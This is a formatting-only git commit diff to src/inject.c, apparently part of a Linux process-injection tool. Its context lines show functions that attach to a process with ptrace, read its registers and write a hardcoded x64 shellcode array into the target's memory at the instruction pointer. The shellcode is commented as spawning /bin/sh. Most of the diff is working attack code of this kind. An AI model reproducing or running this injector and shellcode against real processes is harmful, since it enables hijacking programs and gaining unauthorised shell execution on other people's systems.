839e74bb0e706fb386c5b7c6c321618194ebc048
meep-github <36815692+meep-github@users.noreply.github.com>
2019-05-23 12:29:10 +0100

    Update inject.c
    formatting

--- src/inject.c
+++ src/inject.c
@@ -10,22 +10,22 @@
 
 bool AttachToPID( unsigned int __pid );
 bool GetRegisters(
-			struct user_regs_struct *__regs,
-			unsigned int __pid
+				struct user_regs_struct *__regs,
+				unsigned int __pid
 		 );
 bool InjectShellcode(
-			struct user_regs_struct *__regs,
-			//void *__rip,
-			unsigned int __pid,
-			unsigned int __shellcode_size
+				struct user_regs_struct *__regs,
+				//void *__rip,
+				unsigned int __pid,
+				unsigned int __shellcode_size
 		    );
 bool DetachFromPID( unsigned int __pid );
 
 char _shellcode_[] = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
-        	     "\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
-           	     "\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
-        	     "\x0f\x05"; //			/bin/sh
-				 //			linux x64 bit
+        	     	   "\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
+           	     	   "\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
+        	         "\x0f\x05"; //			/bin/sh
+				         //			linux x64 bit
 
 
 int main(
@@ -61,17 +61,17 @@ bool AttachToPID( unsigned int __pid ) {
 	return true;
 }
 bool GetRegisters(
-			struct user_regs_struct *__regs,
-			unsigned int __pid
+				struct user_regs_struct *__regs,
+				unsigned int __pid
 		 ) {
 	if((ptrace(PTRACE_GETREGS, __pid, 0, *(&__regs))) < 0) return false;
 	return true;
 }
 bool InjectShellcode(
-			struct user_regs_struct *__regs,
-			//void *__rip,
-			unsigned int __pid,
-			unsigned int __shellcode_size
+				struct user_regs_struct *__regs,
+				//void *__rip,
+				unsigned int __pid,
+				unsigned int __shellcode_size
 		    ) {
 	for(int i = 0; i < __shellcode_size; i++) ptrace(PTRACE_POKETEXT, __pid, __regs->rip+i, *(int*)(_shellcode_ + i));
 	return true;
